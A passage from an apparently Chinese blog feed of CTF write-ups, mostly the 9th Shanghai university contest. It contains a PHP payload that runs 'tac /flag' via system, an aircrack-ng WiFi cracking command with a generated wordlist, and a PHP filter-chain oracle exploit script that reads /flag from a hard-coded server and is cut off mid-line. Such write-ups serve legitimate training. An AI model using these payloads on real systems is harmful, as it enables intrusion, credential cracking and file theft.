&amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$w1key</span>) &lt;= <span class="hljs-number">83</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[1-9a-zA-Z!,@#^&amp;%*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$w1key</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$w1key</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;黑客是吧，我看你怎么黑！&quot;</span>);  <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了&quot;</span>);      <br>      &#125;<br>    &#125;   <br><br></code></pre></td></tr></table></figure><h3 id="break-4"><a href="#break-4" class="headerlink" title="break"></a>break</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">POST /index.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">182.92</span>.<span class="hljs-number">117.61</span>:<span class="hljs-number">40746</span><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">125.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Referer: http://mitm/</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 9</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">w1key=%24_%3D(_%2F_._)%5B0%5D%3B%24__%3D%2B%2B%24_%3B%24_0%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_0.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B0%5D(%24%24_%5B_%5D)%3B&amp;0=system&amp;_=tac /flag</span><br></code></pre></td></tr></table></figure><h3 id="fix-4"><a href="#fix-4" class="headerlink" title="fix"></a>fix</h3><p>删除eval</p>]]></content>
    
    
    <categories>
      
      <category>CTFs</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第九届上海市大学生网络安全大赛预赛</title>
    <link href="/2024/05/27/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <url>/2024/05/27/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="字符串加密"><a href="#字符串加密" class="headerlink" title="字符串加密"></a>字符串加密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product<br><br><span class="hljs-comment"># 定义扩展字符集，包括A-Z和2-7</span><br>CUSTOM_CHARSET = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;</span><br><br><span class="hljs-comment"># 加密文本</span><br>ciphertext = <span class="hljs-string">&quot;PMZJFMOOREHWF75S4YMIBQEGR47IBMNUJ47IBL6Q&quot;</span><br><br><span class="hljs-comment"># 映射表：字符到索引</span><br>char_to_index = &#123;char: idx <span class="hljs-keyword">for</span> idx, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CUSTOM_CHARSET)&#125;<br><br><span class="hljs-comment"># 反向映射表：索引到字符</span><br>index_to_char = &#123;idx: char <span class="hljs-keyword">for</span> idx, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(CUSTOM_CHARSET)&#125;<br><br><span class="hljs-comment"># 函数：计算模逆元</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modinv</span>(<span class="hljs-params">a, m</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, m):<br>        <span class="hljs-keyword">if</span> (a * x) % m == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> x<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 遍历a和b的所有可能值</span><br><span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> product(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(CUSTOM_CHARSET)), repeat=<span class="hljs-number">2</span>):  <span class="hljs-comment"># a不能为0</span><br>    <span class="hljs-keyword">if</span> modinv(a, <span class="hljs-built_in">len</span>(CUSTOM_CHARSET)) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># 仿射解密</span><br>        plaintext_numbers = []<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> ciphertext:<br>            <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> char_to_index:<br>                index = (char_to_index[char] - b) * modinv(a, <span class="hljs-built_in">len</span>(CUSTOM_CHARSET)) % <span class="hljs-built_in">len</span>(CUSTOM_CHARSET)<br>                plaintext_numbers.append(index)<br>            <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 对于非预期字符，这里简单跳过</span><br>                <span class="hljs-keyword">continue</span><br>        <br>        <span class="hljs-comment"># 将索引转换回字符</span><br>        plaintext = <span class="hljs-string">&quot;&quot;</span>.join(index_to_char[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> plaintext_numbers)<br>        <br>        <span class="hljs-comment"># 尝试Base32解码并检查是否以&quot;flag&#123;&quot;开头</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># 注意：由于我们的字符集与标准Base32不完全一致，这里的解码可能不会成功</span><br>            <span class="hljs-comment"># 但为了遵循要求，我们尝试进行解码</span><br>            decoded_text = base64.b32decode(plaintext.upper().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>            <span class="hljs-keyword">if</span> decoded_text.startswith(<span class="hljs-string">&quot;flag&#123;&quot;</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found: a=<span class="hljs-subst">&#123;a&#125;</span>, b=<span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted and Base32 Decoded: <span class="hljs-subst">&#123;decoded_text&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 忽略解码错误</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Found: a=17, b=3</span><br><span class="hljs-string">Decrypted and Base32 Decoded: flag&#123;tH1s_Is_v3ry_eA2y_!&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h3 id="wifi密码"><a href="#wifi密码" class="headerlink" title="wifi密码"></a>wifi密码</h3><p>小明忘了自家的wifi密码，已知wifi密码共8位，前5位为小写字母，后3位为数字，小明依稀记得第一位字母是p，第五位字母为r,第8位数字为6，请破解小明家的wifi密码，flag格式为flag{密码}<br>参考<a href="https://www.sec4.fun/2020/01/19/wifi-crack/">https://www.sec4.fun/2020/01/19/wifi-crack/</a><br><img src="/mdimg/psctf2024/1716617190084-43c57b21-2078-4d54-adb0-b95ba01840ed.png"><br><code>BE:CE:98:FB:05:09  米13</code><br>生成字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment"># 初始化字典</span><br>generated_dict = &#123;&#125;<br><br><span class="hljs-comment"># 小写字母集合和数字集合</span><br>letters = string.ascii_lowercase<br>digits = string.digits<br><br><span class="hljs-comment"># 遍历所有可能的小写字母组合（3个字母）</span><br><span class="hljs-keyword">for</span> letter1 <span class="hljs-keyword">in</span> letters:<br>    <span class="hljs-keyword">for</span> letter2 <span class="hljs-keyword">in</span> letters:<br>        <span class="hljs-keyword">for</span> letter3 <span class="hljs-keyword">in</span> letters:<br>            <span class="hljs-comment"># 遍历所有可能的数字组合（2个数字）</span><br>            <span class="hljs-keyword">for</span> digit1 <span class="hljs-keyword">in</span> digits:<br>                <span class="hljs-keyword">for</span> digit2 <span class="hljs-keyword">in</span> digits:<br>                    <span class="hljs-comment"># 生成键并添加到字典中</span><br>                    key = <span class="hljs-string">f&quot;p<span class="hljs-subst">&#123;letter1&#125;</span><span class="hljs-subst">&#123;letter2&#125;</span><span class="hljs-subst">&#123;letter3&#125;</span>r<span class="hljs-subst">&#123;digit1&#125;</span><span class="hljs-subst">&#123;digit2&#125;</span>6&quot;</span><br>                    generated_dict[key] = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 或者赋予其他默认值</span><br><br><span class="hljs-comment"># 打印生成的字典的长度，避免打印整个巨大字典</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Generated dictionary with <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(generated_dict)&#125;</span> entries.&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;passwd.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> generated_dict:<br>        file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;key&#125;</span>\n&quot;</span>)  <span class="hljs-comment"># 每个键后面跟一个换行符</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Dictionary content has been saved to passwd.txt.&quot;</span>)<br></code></pre></td></tr></table></figure><p><code>aircrack-ng -e 米13 -b BE:CE:98:FB:05:09 -w &#39;/home/kali/Desktop/passwd.txt&#39; &#39;/home/kali/Desktop/wifipwd.cap&#39; </code><br><img src="/mdimg/psctf2024/1716617507482-ff546c9c-3b7d-4126-b2c8-54658f252968.png"><br><code>power456</code></p><h3 id="5GC网元AMF名称"><a href="#5GC网元AMF名称" class="headerlink" title="5GC网元AMF名称"></a>5GC网元AMF名称</h3><p><img src="/mdimg/psctf2024/1716622236468-bf118b49-570e-4405-8f96-2facf25dd43a.png"><br><code>ZmxhZ3thbWZuYW1lLXVqcnIxMTIzfQ==</code><br><code>flag&#123;amfname-ujrr1123&#125;</code></p><h3 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h3><p><code>tshark -r secrets.pcap -Y &quot;icmp &amp;&amp; icmp.type==8&quot; -T fields -e data.len &gt; flag.txt</code><br><code>awk &#39;&#123;for(i=1;i&lt;=NF;i++) printf(&quot;%c&quot;,$i);&#125;&#39; flag.txt</code><br><img src="/mdimg/psctf2024/1716626567559-9a6cea01-4aa3-4fef-87ff-ebbbc5e94327.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="php01"><a href="#php01" class="headerlink" title="php01"></a>php01</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>highlight_file(__FILE__);<br><span class="hljs-keyword">if</span>(isset($_POST[<span class="hljs-string">&quot;V50&quot;</span>]))<br><br>&#123;<br>    file($_POST[<span class="hljs-string">&quot;V50&quot;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    echo <span class="hljs-string">&quot;key.php&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一眼测信道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">THE GRAND IDEA:</span><br><span class="hljs-string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span><br><span class="hljs-string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span><br><span class="hljs-string">the string is empty.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE GRAND IDEA 2:</span><br><span class="hljs-string">The dechunk filter is interesting.</span><br><span class="hljs-string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span><br><span class="hljs-string">It looks like it was implemented for something http related, but for our purposes, the interesting</span><br><span class="hljs-string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span><br><span class="hljs-string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span><br><span class="hljs-string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span><br><span class="hljs-string"></span><br><span class="hljs-string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span><br><span class="hljs-string"></span><br><span class="hljs-string">does not cause a 500 error.</span><br><span class="hljs-string"></span><br><span class="hljs-string">THE REST:</span><br><span class="hljs-string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span><br><span class="hljs-string">into madness trying to figure out ways to:</span><br><span class="hljs-string">- somehow get other characters not at the start of the flag file to the front</span><br><span class="hljs-string">- detect more precisely which character is at the front</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">join</span>(<span class="hljs-params">*x</span>):<br><span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;|&#x27;</span>.join(x)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">err</span>(<span class="hljs-params">s</span>):<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">raise</span> ValueError<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">req</span>(<span class="hljs-params">s</span>):<br>data = &#123;<br><span class="hljs-string">&#x27;V50&#x27;</span>: <span class="hljs-string">f&#x27;php://filter/<span class="hljs-subst">&#123;s&#125;</span>/resource=/flag&#x27;</span><br>&#125;<br><span class="hljs-keyword">return</span> requests.post(<span class="hljs-string">&#x27;http://222.67.132.186:20798/index.php&#x27;</span>, data=data).status_code == <span class="hljs-number">500</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Step 1:</span><br><span class="hljs-string">The second step of our exploit only works under two conditions:</span><br><span class="hljs-string">- String only contains a-zA-Z0-9</span><br><span class="hljs-string">- String ends with two equals signs</span><br><span class="hljs-string"></span><br><span class="hljs-string">base64-encoding the flag file twice takes care of the first condition.</span><br><span class="hljs-string"></span><br><span class="hljs-string">We don&#x27;t know the length of the flag file, so we can&#x27;t be sure that it will end with two equals</span><br><span class="hljs-string">signs.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Repeated application of the convert.quoted-printable-encode will only consume additional</span><br><span class="hljs-string">memory if the base64 ends with equals signs, so that&#x27;s what we are going to use as an oracle here.</span><br><span class="hljs-string">If the double-base64 does not end with two equals signs, we will add junk data to the start of the</span><br><span class="hljs-string">flag with convert.iconv..CSISO2022KR until it does.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>blow_up_enc = join(*[<span class="hljs-string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="hljs-number">1000</span>)<br>blow_up_utf32 = <span class="hljs-string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span><br>blow_up_inf = join(*[blow_up_utf32]*<span class="hljs-number">50</span>)<br><br>header = <span class="hljs-string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span><br><br><span class="hljs-comment"># Start get baseline blowup</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calculating blowup&#x27;</span>)<br>baseline_blowup = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>payload = join(*[blow_up_utf32]*n)<br><span class="hljs-keyword">if</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;payload&#125;</span>&#x27;</span>):<br>baseline_blowup = n<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;baseline blowup is <span class="hljs-subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)<br><br>trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">assert</span> req(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;header&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;detecting equals&#x27;</span>)<br>j = [<br>req(<span class="hljs-string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="hljs-subst">&#123;blow_up_enc&#125;</span>|<span class="hljs-subst">&#123;trailer&#125;</span>&#x27;</span>),<br>req(<span 